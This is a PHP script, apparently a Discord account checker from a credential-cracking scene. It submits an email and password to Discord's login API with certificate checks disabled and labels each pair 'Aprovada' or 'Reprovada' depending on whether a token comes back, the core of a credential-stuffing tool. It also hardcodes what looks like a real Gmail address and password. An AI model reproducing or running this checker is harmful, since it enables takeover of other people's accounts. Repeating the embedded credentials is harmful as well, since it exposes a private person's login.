<?php

/*-------------------*/
#  Coded By Hyperguy  # 
#   t.me/SpiritCoder  #
#     2019/01/14      #
/*-------------------*/

ini_set("max_execution_time", 0);
ini_set("memory_limit", "-1");

function catcha($string,$start,$end){
    $str = explode($start,$string);
    $str = explode($end,$str[1]);
    return $str[0];
}

function DelCookie()
{
	if (file_exists('Cookie.txt')) 
		{
			unlink('Cookie.txt');
	}
}

DelCookie();

Class Curl
{

	public $email;
	public $senha;
	public $url;
	public $headers;

	public function Response()
	{

	$ch = curl_init();

		curl_setopt($ch, CURLOPT_URL, $this->url);

			curl_setopt($ch, CURLOPT_FOLLOWLOCATION, false);

				curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

					curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);

						curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);

							curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);

								curl_setopt($ch, CURLOPT_COOKIEJAR, dirname(__FILE__) . '/Cookie.txt');

									curl_setopt($ch, CURLOPT_COOKIEFILE, dirname(__FILE__) . '/Cookie.txt');

										curl_setopt($ch, CURLOPT_HTTPHEADER, $this->headers);

											curl_setopt($ch, CURLOPT_POST, true);

												curl_setopt($ch, CURLOPT_POSTFIELDS, '{"email":"'.$this->email.'","password":"'.$this->senha.'","undelete":false,"captcha_key":null,"login_source":null,"gift_code_sku_id":null}');

													$Login = curl_exec($ch);

														curl_close($ch);

															 // echo "$Login";

															if(strpos($Login, 'token'))
															{
																echo "Aprovada-> $this->email|$this->senha by Hyperguy";
															}
															elseif(strpos($Login, 'password'))
															{
																echo "Reprovada-> $this->email|$this->senha by Hyperguy";
															}

															   }

}

$Curlexec = new Curl();

	$Curlexec->url = 'https://discordapp.com/api/v6/auth/login';

		$Curlexec->email = 'mirror.freefire@gmail.com';

			$Curlexec->senha = '73542155a';

				$Curlexec->headers = array('Accept-Language: pt-BR',
					'Accept: */*',
						'Host: discordapp.com',
							'Connection: Keep-Alive',
								'Origin: https://discordapp.com',
									'Referer: https://discordapp.com/login',
										'Content-Type: application/json');

				$Curlexec->Response();

?>